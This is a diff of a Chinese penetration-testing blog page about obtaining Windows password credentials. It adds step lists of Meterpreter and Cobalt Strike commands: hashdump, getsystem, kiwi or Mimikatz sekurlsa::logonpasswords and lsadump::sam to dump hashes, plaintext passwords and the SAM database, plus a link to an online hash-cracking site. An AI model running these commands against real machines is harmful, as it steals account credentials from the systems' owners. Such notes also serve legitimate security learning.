@@ -31,8 +31,12 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110213957620.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110214308301.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110214838397.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112135357843.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112135605815.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112135914371.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112140327159.png">
 <meta property="article:published_time" content="2024-01-10T08:20:20.000Z">
-<meta property="article:modified_time" content="2024-01-10T14:25:03.362Z">
+<meta property="article:modified_time" content="2024-01-12T10:59:16.226Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -236,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.6k words
+          4.9k words
         
       </span>
     
@@ -247,7 +251,7 @@
         
         
         
-          39 mins
+          41 mins
         
       </span>
     
@@ -539,7 +543,49 @@
 
 
 
-<h3 id="Meterpreter获取Hash"><a href="#Meterpreter获取Hash" class="headerlink" title="Meterpreter获取Hash"></a>Meterpreter获取Hash</h3>
+<h3 id="Meterpreter获取Hash"><a href="#Meterpreter获取Hash" class="headerlink" title="Meterpreter获取Hash"></a>Meterpreter获取Hash</h3><ol>
+<li><p>查询是什么身份</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getuid</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取hash值</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112135357843.png" srcset="/img/loading.gif" lazyload alt="image-20240112135357843"></p>
+<p>可以反映出相关的hash</p>
+</li>
+<li><p>提权到system</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getsystem</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112135605815.png" srcset="/img/loading.gif" lazyload alt="image-20240112135605815"></p>
+</li>
+<li><p>加载猕猴桃模块</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112135914371.png" srcset="/img/loading.gif" lazyload alt="image-20240112135914371"></p>
+</li>
+<li><p>获取明文密码</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">creds_all<br>kiwi_cmd sekurlsa::logonpasswords <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>返回之前的权限</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">rev2self<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取sam数据库</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112140327159.png" srcset="/img/loading.gif" lazyload alt="image-20240112140327159"></p>
+</li>
+</ol>
+<h3 id="CS-获取hash"><a href="#CS-获取hash" class="headerlink" title="CS 获取hash"></a>CS 获取hash</h3><p>主要还是使用   Mimikatz  </p>
+<ol>
+<li><p>获取hash</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取密码</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">logonpasswords<br>mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取sam</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz lsadump::sam<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="hash解密"><a href="#hash解密" class="headerlink" title="hash解密"></a>hash解密</h3><p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
+
                 
               </div>
             
